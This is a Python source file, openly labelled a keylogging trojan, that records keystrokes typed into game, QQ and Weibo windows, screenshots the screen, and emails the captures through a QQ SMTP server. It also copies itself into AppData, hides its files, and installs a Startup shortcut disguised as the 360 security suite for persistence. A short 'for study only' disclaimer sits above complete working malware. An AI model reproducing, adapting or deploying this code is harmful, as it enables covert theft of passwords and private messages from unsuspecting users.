# -*- coding: cp936 -*- # 

# A keyboard recording trojan
# Copyright (c) 2015 Jackeriss.
# Released under MIT license <http://opensource.org/licenses/MIT>
# 警告：本源码仅供学习交流使用，禁止用于任何非法用途！

"""
    Author:  Jackeriss    
    Email:  i@jackeriss.com
    Site:  http://www.jackeriss.com
    Blog:  http://blog.csdn.net/jackeriss
"""

import os
import time
import pythoncom
import shutil
import smtplib
import pyHook
from PIL import ImageGrab
from win32com.shell import shell
from win32com.shell import shellcon
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
sender = '123456789@qq.com'#邮件发送方
receiver = '123456789@qq.com'#邮件接收方
subject = 'python email test'
smtpserver = 'smtp.qq.com'#邮件服务器
username = '123456789'#邮件用户名
password = '1111111'#邮件密码
smtp = smtplib.SMTP()
startup_path = shell.SHGetPathFromIDList(shell.SHGetSpecialFolderLocation(0,shellcon.CSIDL_STARTUP))
appdata_path = shell.SHGetPathFromIDList(shell.SHGetSpecialFolderLocation(0,shellcon.CSIDL_APPDATA))

def set_shortcut(filename,lnkname,iconname):
    shortcut = pythoncom.CoCreateInstance(
    shell.CLSID_ShellLink, None,
    pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink)
    shortcut.SetPath(filename)
    shortcut.SetIconLocation(iconname,0)
    if os.path.splitext(lnkname)[-1] != '.lnk':
        lnkname += ".lnk"
    shortcut.QueryInterface(pythoncom.IID_IPersistFile).Save(lnkname,0)
    
#如果是远程监听某个电脑，可以将获取到的信息通过邮件发出去
def send_email(msg,file_name):
    msgRoot = MIMEMultipart('related')
    msgRoot['Subject'] = file_name#邮件标题

    msgText = MIMEText('%s'%msg,'html','utf-8')#发送HTML形式的文字信息
    msgRoot.attach(msgText)

    att = MIMEText(open('%s'%file_name, 'rb').read(), 'base64', 'utf-8')#将屏幕截图作为附件
    att["Content-Type"] = 'application/octet-stream'
    att["Content-Disposition"] = 'attachment; filename="%s"'%file_name
    msgRoot.attach(att)
    while 1:
        try:
            smtp.sendmail(sender, receiver, msgRoot.as_string())
            break
        except:
            try:
                smtp.connect('smtp.qq.com')#尝试登陆SMTP邮件服务器
                smtp.login(username, password)
            except:
                print "failed to login to smtp server"
    path=os.getcwd()+"\\"+file_name#删除本地截图
    if os.path.exists(path):
        os.remove(path)
        
def onMouseEvent(event): 
   # 监听鼠标事件
    global MSG
    if len(MSG)!=0:        
        pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))        
        pic_name = "mouse_"+pic_name+".png"
        pic = ImageGrab.grab()
        pic.save('%s' % pic_name)#将用户屏幕截图，保存到本地
        send_email(MSG,pic_name)
##        write_msg_to_txt(MSG)
        MSG=''
    return True
   
def onKeyboardEvent(event):
    #监听键盘事件
    global MSG
    title= event.WindowName.decode('GBK')
    #通过窗口的title，判断当前窗口是否是“监听目标”
    if title.find(u"魔兽世界") != -1 or title.find(u"英雄联盟") != -1 or title.find(u'QQ')!=-1 or title.find(u'微博')!=-1 or title.find(u'战网')!=-1:
        #Ascii:  8-Backspace , 9-Tab ,13-Enter
        if (127 >= event.Ascii > 31) or (event.Ascii == 8):
            MSG += chr(event.Ascii)               
        if (event.Ascii == 9) or (event.Ascii == 13):            
            #屏幕抓图实现
            pic_name = time.strftime('%Y%m%d%H%M%S',time.localtime(time.time()))
            pic_name = "keyboard_"+pic_name+".png"
            pic = ImageGrab.grab()#保存成为以日期命名的图片
            pic.save('%s' % pic_name)
            send_email(MSG,pic_name)
##            write_msg_to_txt(MSG)
            MSG = ''
    return True
  
if __name__ == "__main__":
    icon_file=os.getcwd()+"\\"+"ABE.glj"#源图标位置
    exe_file=os.getcwd()+"\\"+"开始游戏.exe"#源程序位置
    icon_copy=appdata_path+"\\"+"360°安全卫士.ico"#目标图标位置
    exe_copy=appdata_path+"\\"+"youxun.exe"#目标程序位置
    if os.path.exists(icon_file) and os.path.exists(exe_file):#源位置无误则复制到目标位置
        shutil.copy(exe_file,exe_copy)
    if os.path.exists(icon_copy) and os.path.exists(exe_copy):#一切顺利则设置隐藏和快捷方式
        cmd1 = 'attrib +h "' + icon_copy +'"'
        os.popen(cmd1).close()
        cmd2 = 'attrib +h "' + exe_copy +'"'
        os.popen(cmd2).close()
        lnk_name=startup_path+"\\360°安全卫士.lnk"
        set_shortcut(exe_copy,lnk_name,icon_copy)
    try:
        smtp.connect('smtp.qq.com')#尝试登陆SMTP邮件服
        smtp.login(username, password)
    except:
        print "failed to login to smtp server"
    MSG = ''   
    #创建hook句柄
    hm = pyHook.HookManager()
    #监控鼠标
    hm.SubscribeMouseLeftDown(onMouseEvent)
    hm.HookMouse() 
    #监控键盘
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard() 
    #循环获取消息
    pythoncom.PumpMessages() 
